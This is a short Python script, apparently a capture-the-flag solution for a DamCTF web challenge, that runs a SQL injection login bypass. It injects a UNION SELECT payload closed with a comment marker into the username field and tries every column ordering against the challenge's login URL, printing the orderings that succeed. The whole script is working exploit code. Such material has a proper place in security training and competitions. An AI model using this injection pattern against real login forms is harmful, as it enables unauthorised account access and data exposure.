from requests import post
from itertools import permutations

types = ["'BobbySinclusto'", "789459139", "127", "null"]

for p in permutations(types):
    username = f"BobbySinclusto' union select {', '.join(p)}; -- "
    password = ""

    payload = {
        "username_input": username,
        "password_input": password
    }

    res = post("https://bouncy-box.chals.damctf.xyz/login", data=payload)

    if res.status_code == 200:
        print(f"{username} -> [{res.status_code}]")

